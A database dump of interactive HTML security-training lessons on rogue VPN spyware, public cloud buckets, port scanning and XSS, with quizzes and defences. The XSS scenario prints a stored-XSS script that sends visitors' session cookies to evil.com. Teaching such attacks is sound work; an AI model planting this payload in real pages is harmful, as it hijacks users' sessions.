onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T17 ROGUE VPN ══════════════════════════════════ -->\n<section class="topic-section" id="t17">\n  <div class="section-header">\n    <div class="section-num">// 17</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Rogue Applications, Spyware & DLP Controls</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Endpoint Threat</span>\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Data Exfiltration</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">An employee at <mark>TechFirm</mark> installs a free VPN app from an unofficial source. The VPN intercepts all browser traffic, injects ads into HTTP pages, and sends browsing history to a remote server. The corporate firewall only sees <code>encrypted VPN traffic</code> leaving the endpoint.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Why Endpoint-Only Controls Fail</div>\n    <div class="cb-body">\n      Traditional antivirus depends on <em>signatures</em> — detecting known malware patterns. A rogue VPN app that is not yet in threat intel databases bypasses signature AV entirely. Behaviour-based detection is also unreliable here because the process <em>looks like a legitimate VPN</em> — it creates a network tunnel and routes traffic, which is exactly what a real VPN does.<br><br>\n      The corporate perimeter firewall sees only outbound encrypted traffic to a VPN endpoint — it cannot inspect inside the tunnel. The malicious behaviour is invisible to traditional perimeter security.\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">📋</div>\n      <div class="dc-title">Application Whitelisting</div>\n      <div class="dc-desc">Only pre-approved corporate applications are permitted to execute. Any application not on the approved list (e.g. an unofficial VPN) is blocked at the OS level before it can run.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔍</div>\n      <div class="dc-title">DLP with SSL Inspection (SASE/Proxy)</div>\n      <div class="dc-desc">A corporate proxy or SASE solution performs SSL/TLS inspection — endpoints trust a corporate CA, allowing encrypted traffic to be decrypted, inspected for data exfiltration, then re-encrypted. Even tunnelled traffic can be inspected.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">Spyware</span>\n    <span class="concept-tag ct-amber">Rogue Application</span>\n    <span class="concept-tag ct-green">App Whitelisting</span>\n    <span class="concept-tag ct-blue">DLP</span>\n    <span class="concept-tag ct-cyan">SSL Inspection</span>\n    <span class="concept-tag ct-purple">SASE</span>\n    <span class="concept-tag ct-red">Data Exfiltration</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why is signature-based antivirus insufficient as the sole control against a newly-distributed rogue VPN application?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''AV only scans files on disk, not network-installed apps.'')"><span class="opt-letter">A</span>Antivirus only scans files saved to disk and cannot inspect network-delivered executables.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! Signature AV requires a known malware pattern — a brand-new rogue app has no signature yet. Zero-day and novel malware will bypass it entirely. Additionally, the rogue app mimics legitimate VPN behaviour, making behavioural detection difficult.'')"><span class="opt-letter">B</span>A newly distributed app has no AV signature yet — it won\\''t be detected, and its legitimate-looking VPN behaviour evades behavioural rules.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''AV software is disabled by VPN apps during installation.'')"><span class="opt-letter">C</span>VPN applications are designed to disable antivirus software during the installation process.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''AV does not run on administrator accounts.'')"><span class="opt-letter">D</span>Standard AV solutions do not scan applications installed by users with administrator privileges.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T18 CLOUD BUCKET ══════════════════════════════════ -->\n<section class="topic-section" id="t18">\n  <div class="section-header">\n    <div class="section-num">// 18</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Cloud Storage Misconfiguration & Data Exposure</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Cloud Security</span>\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Misconfiguration</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A junior admin at <mark>CloudOps Inc.</mark> accidentally makes a cloud storage bucket public. It contains <code>network diagrams</code>, <code>firewall rules</code>, <code>IP addressing schemes</code>, and <code>VPN credentials</code>. A threat actor downloads all files within 2 hours.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Attack Value of Each Exposed Asset</div>\n    <div class="cb-body">\n      <strong>Network Diagrams / IP Schemes:</strong> Enables <em>targeted reconnaissance</em> — the attacker knows exactly which systems exist, their roles, and the attack path to high-value targets. No scanning needed.<br><br>\n      <strong>Firewall Rules:</strong> Reveals <em>what traffic is permitted</em> — attackers craft bypass traffic that exactly matches permit rules. They know which ports are open, which IPs have access, and what is denied.<br><br>\n      <strong>VPN Credentials:</strong> Most critical — <em>direct authenticated access</em> bypassing the perimeter entirely. The attacker appears as a legitimate remote user.\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">🚫</div>\n      <div class="dc-title">Block Public Access Policy</div>\n      <div class="dc-desc">Cloud accounts should enforce organisation-wide "block all public access" policies at the account/organisation level — individual admins cannot accidentally override them.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔍</div>\n      <div class="dc-title">DLP Scanning of Storage</div>\n      <div class="dc-desc">Automated scans of cloud storage objects detect sensitive content patterns (credentials, PII, internal IPs) and alert or quarantine before exposure.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔐</div>\n      <div class="dc-title">Secrets Management Vault</div>\n      <div class="dc-desc">Credentials must never exist in documents or configuration files. Use vaults (HashiCorp Vault, AWS Secrets Manager) — applications retrieve secrets programmatically with audit trails.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">Data Exposure</span>\n    <span class="concept-tag ct-amber">Cloud Misconfiguration</span>\n    <span class="concept-tag ct-red">VPN Credentials</span>\n    <span class="concept-tag ct-purple">Reconnaissance</span>\n    <span class="concept-tag ct-green">Secrets Management</span>\n    <span class="concept-tag ct-blue">DLP</span>\n    <span class="concept-tag ct-cyan">Block Public Access</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Of the four types of data exposed in the bucket (diagrams, firewall rules, IPs, VPN credentials), which enables the attacker to bypass the perimeter entirely without any further exploitation?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Network diagrams enable the most targeted attacks.'')"><span class="opt-letter">A</span>Network diagrams — they reveal the complete internal architecture and attack paths.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Firewall rules reveal permitted traffic paths.'')"><span class="opt-letter">B</span>Firewall rules — they allow the attacker to craft traffic that bypasses inspection.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! VPN credentials allow the attacker to authenticate as a legitimate remote user. They appear as valid corporate traffic and bypass the perimeter firewall entirely — no exploitation needed.'')"><span class="opt-letter">C</span>VPN credentials — the attacker authenticates as a legitimate user, bypassing the perimeter without any exploitation.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''IP addressing schemes enable precision targeting.'')"><span class="opt-letter">D</span>IP addressing schemes — they eliminate the need for network scanning before an attack.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T19 PORT SCANNING ══════════════════════════════════ -->\n<section class="topic-section" id="t19">\n  <div class="section-header">\n    <div class="section-num">// 19</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Port Scanning & Reconnaissance Techniques</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Reconnaissance</span>\n        <span class="smeta-tag ct-blue" style="border-color:rgba(74,140,255,0.3)">Pre-Attack Phase</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A security operations team detects a series of <code>SYN packets</code> from a single external IP hitting every port from 1–65535 on their public web server in under 60 seconds. No SYN-ACK responses are being completed. The pattern shows <mark>sequential port ordering</mark>.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Port Scanning Techniques</div>\n    <div class="cb-body">\n      Port scanning is the process of probing a host to discover which TCP/UDP ports are open — revealing running services and potential attack surfaces. It''s a fundamental reconnaissance step before targeted exploitation.<br><br>\n      <strong>SYN Scan (Half-Open Scan):</strong> Sends SYN packets. Open ports reply with SYN-ACK. The scanner sends RST (never completes the handshake) — stealthy, no connection is logged. Closed ports send RST immediately.<br><br>\n      <strong>Connect Scan:</strong> Completes the full TCP handshake — easily logged by the target.<br><br>\n      <strong>UDP Scan:</strong> Sends empty UDP datagrams. Closed ports return ICMP "port unreachable." Open ports don''t respond (or respond with application data).<br><br>\n      <strong>OS Fingerprinting:</strong> Different OSes have subtly different TCP/IP stack behaviours (TTL values, window sizes, response to unusual flags). Scanners like nmap use these to identify the target OS.\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">🚪</div>\n      <div class="dc-title">Minimise Attack Surface</div>\n      <div class="dc-desc">Only expose ports that are absolutely necessary. All unused ports should be closed or firewalled. The fewer open ports, the smaller the attack surface available after scanning.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">📊</div>\n      <div class="dc-title">Rate Limiting & IDS Detection</div>\n      <div class="dc-desc">IDS rules detect rapid sequential port probing patterns. Rate limiting drops SYN packets from IPs exceeding a connection attempt threshold per second.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🕵️</div>\n      <div class="dc-title">Port Knocking / Honeypots</div>\n      <div class="dc-desc">Honeypot ports that are never legitimately accessed can detect scanning activity. Any connection to a honeypot port is definitively malicious.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-amber">Port Scanning</span>\n    <span class="concept-tag ct-blue">SYN Scan</span>\n    <span class="concept-tag ct-cyan">Reconnaissance</span>\n    <span class="concept-tag ct-red">nmap</span>\n    <span class="concept-tag ct-green">Attack Surface</span>\n    <span class="concept-tag ct-purple">OS Fingerprinting</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why is a SYN scan (half-open scan) considered stealthier than a full connect scan?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''SYN scans use UDP which is harder to detect.'')"><span class="opt-letter">A</span>SYN scans use UDP which is stateless and harder for firewalls to detect.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! A SYN scan never completes the TCP handshake — the scanner sends RST after receiving SYN-ACK. Many application-level logs only record completed connections. The half-open scan avoids leaving a full connection record, making it harder to detect in higher-level logs.'')"><span class="opt-letter">B</span>SYN scans never complete the TCP handshake — no full connection is established, so many application logs don\\''t record them.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''SYN packets are encrypted and not visible to IDS.'')"><span class="opt-letter">C</span>SYN packets are encrypted at the network layer and cannot be inspected by IDS systems.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''SYN scans randomise source IPs to avoid detection.'')"><span class="opt-letter">D</span>SYN scans automatically spoof different source IPs for every probe packet sent.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T20 XSS ══════════════════════════════════ -->\n<section class="topic-section" id="t20">\n  <div class="section-header">\n    <div class="section-num">// 20</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Cross-Site Scripting (XSS) Attacks</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Web Application Attack</span>\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Client-Side Injection</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A security researcher finds that a comment field on a <mark>social platform</mark> does not sanitise user input. They post <code>&lt;script&gt;document.location=''https://evil.com/steal?c=''+document.cookie&lt;/script&gt;</code>. Every user who views the comment page has their session cookie exfiltrated silently.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">XSS Types</div>\n    <div class="cb-body">\n      <strong>Stored XSS (Persistent):</strong> Malicious script is saved to the server (database, comment field). Every user who views the affected page executes the script. Highest impact — no interaction with the attacker required after injection.<br><br>\n      <strong>Reflected XSS:</strong> Script is embedded in a URL parameter. The server reflects it back in the response without sanitisation. Attacker tricks victims into clicking a crafted link.<br><br>\n      <strong>DOM-Based XSS:</strong> The vulnerable JavaScript on the page itself reads attacker-controlled input (URL fragment, localStorage) and writes it to the DOM without sanitisation — the server never sees the malicious payload.\n    </div>\n  </div>\n\n  <div class="accordion">\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">🍪</span>\n        <span class="acc-title">Session Hijacking via Cookie Theft</span>\n        <span class="acc-badge ct-red" style="border-color:rgba(255,79,107,0.3)">Impact</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body">The most common XSS payload accesses <code>document.cookie</code> and sends it to an attacker-controlled server. If the session cookie is stolen, the attacker can impersonate the victim without knowing their password. Mitigation: <strong>HttpOnly flag</strong> on cookies prevents JavaScript from reading them.</div>\n    </div>\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">🛡️</span>\n        <span class="acc-title">Content Security Policy (CSP)</span>\n        <span class="acc-badge ct-green" style="border-color:rgba(0,232,122,0.3)">Defence</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body"><strong>CSP</strong> is an HTTP response header that defines which sources of scripts, styles, and other resources are allowed to execute in the browser. A strict CSP like <code>script-src ''self''</code> prevents inline scripts and external script sources — even if injected XSS code exists in the page, the browser refuses to execute it.</div>\n    </div>\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">✏️</span>\n        <span class="acc-title">Output Encoding</span>\n        <span class="acc-badge ct-green" style="border-color:rgba(0,232,122,0.3)">Defence</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body">The primary developer-level fix: <strong>HTML-encode all user input before rendering it in the page</strong>. Convert <code>&lt;</code> to <code>&amp;lt;</code>, <code>&gt;</code> to <code>&amp;gt;</code>, etc. This ensures injected HTML tags are rendered as text — not executed as code by the browser''s HTML parser.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">XSS</span>\n    <span class="concept-tag ct-amber">Stored XSS</span>\n    <span class="concept-tag ct-amber">Reflected XSS</span>\n    <span class="concept-tag ct-blue">DOM XSS</span>\n    <span class="concept-tag ct-green">Output Encoding</span>\n    <span class="concept-tag ct-green">CSP</span>\n    <span class="concept-tag ct-cyan">HttpOnly Cookie</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">A stored XSS script tries to steal cookies with <code>document.cookie</code>. Which single cookie attribute would prevent this specific attack?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The Secure flag prevents cookie exfiltration.'')"><span class="opt-letter">A</span>The Secure flag — it encrypts the cookie so JavaScript cannot read the value.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''SameSite=Strict prevents all cross-site cookie reads.'')"><span class="opt-letter">B</span>SameSite=Strict — it prevents any script from reading cookies set by another origin.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! The HttpOnly attribute tells the browser that this cookie must not be accessible via JavaScript APIs like document.cookie. Even if XSS code executes on the page, it cannot read HttpOnly cookies — completely neutralising the cookie-theft attack vector.'')"><span class="opt-letter">C</span>HttpOnly — it prevents JavaScript access to the cookie via document.cookie entirely.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Content-Security-Policy blocks document.cookie access.'')"><span class="opt-letter">D</span>Content-Security-Policy headers can block JavaScript\\''s access to the cookie API.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n</main>\n</div>\n\n<script>\n// ── Quiz logic ──\nfunction checkQ(btn, result, explanation) {\n  const quizBody = btn.closest(''.quiz-body'');\n  const opts = quizBody.querySelectorAll(''.quiz-opt'');\n  opts.forEach(o => { o.disabled = true; });\n\n  const feedback = quizBody.querySelector(''.quiz-feedback'');\n  const resetBtn = quizBody.querySelector(''.quiz-reset-btn'');\n\n  if (result === ''correct'') {\n    btn.classList.add(''correct'');\n    feedback.className = ''quiz-feedback show qf-correct'';\n    feedback.textContent = explanation;\n  } else {\n    btn.classList.add(''wrong'');\n    // reveal correct\n    opts.forEach(o => {\n      if (o.getAttribute(''onclick'') && o.getAttribute(''onclick'').includes("''correct''")) {\n        o.classList.add(''reveal-correct'');\n      }\n    });\n    feedback.className = ''quiz-feedback show qf-wrong'';\n    feedback.textContent = explanation;\n  }\n\n  resetBtn.classList.add(''show'');\n}\n\nfunction resetQ(resetBtn) {\n  const quizBody = resetBtn.closest(''.quiz-body'');\n  const opts = quizBody.querySelectorAll(''.quiz-opt'');\n  opts.forEach(o => {\n    o.disabled = false;\n    o.classList.remove(''correct'', ''wrong'', ''reveal-correct'');\n  });\n  const feedback = quizBody.querySelector(''.quiz-feedback'');\n  feedback.className = ''quiz-feedback'';\n  feedback.textContent = '''';\n  resetBtn.classList.remove(''show'');\n}\n\n// ── Accordion ──\nfunction toggleAcc(trigger) {\n  const body = trigger.nextElementSibling;\n  const isOpen = trigger.classList.contains(''open'');\n  trigger.classList.toggle(''open'', !isOpen);\n  body.classList.toggle(''open'', !isOpen);\n}\n\n// ── Scroll progress ──\nwindow.addEventListener(''scroll'', () => {\n  const scrollTop = window.scrollY;\n  const docHeight = document.documentElement.scrollHeight - window.innerHeight;\n  const pct = docHeight > 0 ? (scrollTop / docHeight * 100) : 0;\n  document.getElementById(''progress-bar'').style.width = pct + ''%'';\n\n  const topBtn = document.getElementById(''top-btn'');\n  topBtn.classList.toggle(''show'', scrollTop > 400);\n});\n\n// ── Intersection observer for section animations ──\nconst observer = new IntersectionObserver((entries) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      entry.target.style.animation = ''none'';\n      entry.target.offsetHeight;\n      entry.target.style.animation = '''';\n      entry.target.classList.add(''visible'');\n      observer.unobserve(entry.target);\n    }\n  });\n}, { threshold: 0.08 });\n\ndocument.querySelectorAll(''.topic-section'').forEach((s, i) => {\n  s.style.animationDelay = ''0.1s'';\n  observer.observe(s);\n});\n\n// ── Sidebar active state ──\nconst sections = document.querySelectorAll(''.topic-section'');\nconst navItems = document.querySelectorAll(''.nav-item'');\n\nconst activeObserver = new IntersectionObserver((entries) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      const id = entry.target.getAttribute(''id'');\n      navItems.forEach(n => {\n        n.classList.toggle(''active'', n.getAttribute(''href'') === ''#'' + id);\n      });\n    }\n  });\n}, { threshold: 0.3, rootMargin: ''-20% 0px -60% 0px'' });\n\nsections.forEach(s => activeObserver.observe(s));\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 7, 'Published', 1, '2026-03-06 03:43:06', '2026-03-10 10:16:05', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(13, 8, NULL, 'Cybersecurity Fundamentals', 'Fundamentals', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Cybersecurity Fundamentals</title>\n<style>\n  @import url(''https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Exo+2:wght@200;400;700;900&display=swap'');\n\n  :root {\n    --bg: #020810;\n    --panel: #060f1e;\n    --panel2: #081428;\n    --accent: #00f5c4;\n    --accent2: #0af;\n    --danger: #ff3366;\n    --warn: #ffaa00;\n    --text: #c8e0ff;\n    --dim: #4a6a8a;\n    --grid: rgba(0,245,196,0.04);\n    --glow: 0 0 20px rgba(0,245,196,0.3);\n    --glow2: 0 0 30px rgba(0,170,255,0.25);\n  }\n\n  * { margin:0; padding:0; box-sizing:border-box; }\n\n  body {\n    background: var(--bg);\n    color: var(--text);\n    font-family: ''Rajdhani'', sans-serif;\n    min-height: 100vh;\n    overflow-x: hidden;\n    background-image:\n      linear-gradient(var(--grid) 1px, transparent 1px),\n      linear-gradient(90deg, var(--grid) 1px, transparent 1px);\n    background-size: 40px 40px;\n  }\n\n  /* Scanline overlay */\n  body::before {\n    content:'''';\n    position:fixed; inset:0;\n    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.15) 2px, rgba(0,0,0,0.15) 4px);\n    pointer-events:none; z-index:1000;\n  }\n\n  /* Noise texture */\n  body::after {\n    content:'''';\n    position:fixed; inset:0;\n    background-image: url("data:image/svg+xml,%3Csvg viewBox=''0 0 200 200'' xmlns=''http://www.w3.org/2000/svg''%3E%3Cfilter id=''n''%3E%3CfeTurbulence type=''fractalNoise'' baseFrequency=''0.9'' numOctaves=''4'' stitchTiles=''stitch''/%3E%3C/filter%3E%3Crect width=''100%25'' height=''100%25'' filter=''url(%23n)'' opacity=''0.03''/%3E%3C/svg%3E");\n    pointer-events:none; z-index:999; opacity:0.4;\n  }\n\n  /* TOP BAR */\n  .topbar {\n    position: sticky; top:0; z-index: 200;\n    background: rgba(2,8,16,0.95);\n    border-bottom: 1px solid rgba(0,245,196,0.2);\n    padding: 12px 32px;\n    display: flex; align-items: center; justify-content: space-between;\n    backdrop-filter: blur(10px);\n  }\n  .logo {\n    font-family: ''Share Tech Mono'', monospace;\n    font-size: 1.1rem;\n    color: var(--accent);\n    letter-spacing: 2px;\n    text-shadow: var(--glow);\n  }\n  .logo span { color: var(--accent2); }\n  .progress-bar-wrap { display:flex; align-items:center; gap:12px; }\n  .progress-label { font-family:''Share Tech Mono'',monospace; font-size:0.75rem; color:var(--dim); }\n  .progress-track { width:180px; height:4px; background:rgba(0,245,196,0.1); border-radius:2px; }\n  .progress-fill { height:100%; background: linear-gradient(90deg,var(--accent),var(--accent2)); border-radius:2px; transition:width 0.5s ease; width:0%; box-shadow: var(--glow); }\n\n  /* HERO */\n  .hero {\n    text-align:center;\n    padding: 70px 32px 50px;\n    position:relative;\n  }\n  .hero-badge {\n    display:inline-block;\n    font-family:''Share Tech Mono'',monospace;\n    font-size:0.7rem;\n    letter-spacing:4px;\n    color:var(--accent);\n    border:1px solid rgba(0,245,196,0.3);\n    padding:6px 16px;\n    margin-bottom:24px;\n    text-transform:uppercase;\n    animation: pulse-border 3s infinite;\n  }\n  @keyframes pulse-border {\n    0%,100%{border-color:rgba(0,245,196,0.3);}\n    50%{border-color:rgba(0,245,196,0.8);}\n  }\n  .hero h1 {\n    font-family:''Exo 2'',sans-serif;\n    font-size: clamp(2.2rem, 5vw, 4rem);\n    font-weight:900;\n    line-height:1.05;\n    background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, var(--accent2) 100%);\n    -webkit-background-clip:text; -webkit-text-fill-color:transparent;\n    margin-bottom:16px;\n    text-shadow:none;\n  }\n  .hero p {\n    font-size:1.1rem; color:var(--dim); max-width:520px; margin:0 auto 32px;\n    line-height:1.6;\n  }\n\n  /* NARRATION BAR */\n  .narration-bar {\n    max-width:820px; margin:0 auto 40px;\n    background: var(--panel);\n    border:1px solid rgba(0,245,196,0.15);\n    border-radius:12px;\n    padding:18px 24px;\n    display:flex; align-items:center; gap:16px;\n    box-shadow: 0 4px 32px rgba(0,0,0,0.5);\n  }\n  .voice-btn {\n    width:48px; height:48px;\n    border-radius:50%;\n    border:2px solid var(--accent);\n    background:rgba(0,245,196,0.08);\n    color:var(--accent);\n    font-size:1.3rem;\n    cursor:pointer;\n    display:flex; align-items:center; justify-content:center;\n    transition:all 0.2s;\n    flex-shrink:0;\n    box-shadow: var(--glow);\n  }\n  .voice-btn:hover { background:rgba(0,245,196,0.18); transform:scale(1.08); }\n  .voice-btn.speaking { animation: speak-pulse 1s infinite; background:rgba(0,245,196,0.2); }\n  @keyframes speak-pulse {\n    0%,100%{box-shadow:0 0 10px rgba(0,245,196,0.3);}\n    50%{box-shadow:0 0 30px rgba(0,245,196,0.8);}\n  }\n  .narration-text {\n    flex:1;\n    font-family:''Share Tech Mono'',monospace;\n    font-size:0.82rem;\n    color:var(--text);\n    line-height:1.5;\n  }\n  .narration-label { font-size:0.65rem; color:var(--accent); letter-spacing:2px; display:block; margin-bottom:4px; }\n  .voice-controls { display:flex; gap:8px; flex-shrink:0; }\n  .ctrl-btn {\n    background:rgba(0,170,255,0.08);\n    border:1px solid rgba(0,170,255,0.25);\n    color:var(--accent2); font-size:0.75rem;\n    padding:6px 12px; border-radius:6px;\n    cursor:pointer; transition:all 0.2s;\n    font-family:''Share Tech Mono'',monospace;\n  }\n  .ctrl-btn:hover { background:rgba(0,170,255,0.18); }\n\n  /* SECTIONS NAV */\n  .sections-nav {\n    display:flex; justify-content:center; flex-wrap:wrap; gap:10px;\n    max-width:900px; margin:0 auto 48px; padding:0 24px;\n  }\n  .sec-btn {\n    font-family:''Share Tech Mono'',monospace;\n    font-size:0.72rem; letter-spacing:1px;\n    padding:8px 18px; border-radius:6px;\n    border:1px solid rgba(0,245,196,0.2);\n    background:rgba(0,245,196,0.04);\n    color:var(--dim); cursor:pointer;\n    transition:all 0.25s;\n  }\n  .sec-btn:hover, .sec-btn.active {\n    border-color:var(--accent);\n    color:var(--accent);\n    background:rgba(0,245,196,0.1);\n    box-shadow: var(--glow);\n  }\n\n  /* CONTENT AREA */\n  .content-area { max-width:900px; margin:0 auto; padding:0 24px 48px; }\n\n  .section-panel {\n    display:none;\n    animation: fadeIn 0.4s ease;\n  }\n  .section-panel.active { display:block; }\n  @keyframes fadeIn { from{opacity:0; transform:translateY(16px);} to{opacity:1; transform:none;} }\n\n  .section-title {\n    font-family:''Exo 2'',sans-serif;\n    font-size:1.8rem; font-weight:700;\n    color:#fff; margin-bottom:8px;\n    display:flex; align-items:center; gap:12px;\n  }\n  .section-title .icon { font-size:1.5rem; }\n  .section-subtitle { color:var(--dim); font-size:1rem; margin-bottom:28px; }\n\n  /* INFO CARDS */\n  .cards-grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(260px,1fr)); gap:16px; margin-bottom:28px; }\n  .card {\n    background:var(--panel);\n    border:1px solid rgba(0,245,196,0.1);\n    border-radius:12px; padding:22px;\n    transition:all 0.25s;\n    position:relative; overflow:hidden;\n  }\n  .card::before {\n    content:''''; position:absolute; top:0; left:0; right:0; height:2px;\n    background:linear-gradient(90deg,var(--accent),var(--accent2));\n    transform:scaleX(0); transform-origin:left;\n    transition:transform 0.3s;\n  }\n  .card:hover::before { transform:scaleX(1); }\n  .card:hover { border-color:rgba(0,245,196,0.25); transform:translateY(-3px); box-shadow:0 8px 32px rgba(0,0,0,0.4); }\n  .card-icon { font-size:2rem; margin-bottom:12px; }\n  .card h3 { font-family:''Exo 2'',sans-serif; font-size:1rem; font-weight:700; color:#fff; margin-bottom:8px; }\n  .card p { font-size:0.88rem; color:var(--dim); line-height:1.55; }\n  .card .tag {\n    display:inline-block; font-family:''Share Tech Mono'',monospace;\n    font-size:0.65rem; letter-spacing:1px;\n    padding:3px 10px; border-radius:4px; margin-top:10px;\n    background:rgba(0,245,196,0.1); color:var(--accent); border:1px solid rgba(0,245,196,0.2);\n  }\n  .card .tag.danger { background:rgba(255,51,102,0.1); color:var(--danger); border-color:rgba(255,51,102,0.25); }\n  .card .tag.warn { background:rgba(255,170,0,0.1); color:var(--warn); border-color:rgba(255,170,0,0.25); }\n\n  /* THREAT TABLE */\n  .threat-table { width:100%; border-collapse:collapse; margin-bottom:28px; }\n  .threat-table th {\n    font-family:''Share Tech Mono'',monospace; font-size:0.7rem; letter-spacing:2px;\n    color:var(--accent); text-align:left; padding:10px 14px;\n    border-bottom:1px solid rgba(0,245,196,0.2);\n    background:rgba(0,245,196,0.03);\n  }\n  .threat-table td {\n    padding:12px 14px; border-bottom:1px solid rgba(255,255,255,0.04);\n    font-size:0.88rem; color:var(--text);\n  }\n  .threat-table tr:hover td { background:rgba(0,245,196,0.04); }\n  .sev { display:inline-block; width:10px; height:10px; border-radius:50%; margin-right:6px; }\n  .sev.high { background:var(--danger); box-shadow:0 0 6px var(--danger); }\n  .sev.med { background:var(--warn); box-shadow:0 0 6px var(--warn); }\n  .sev.low { background:var(--accent); box-shadow:0 0 6px var(--accent); 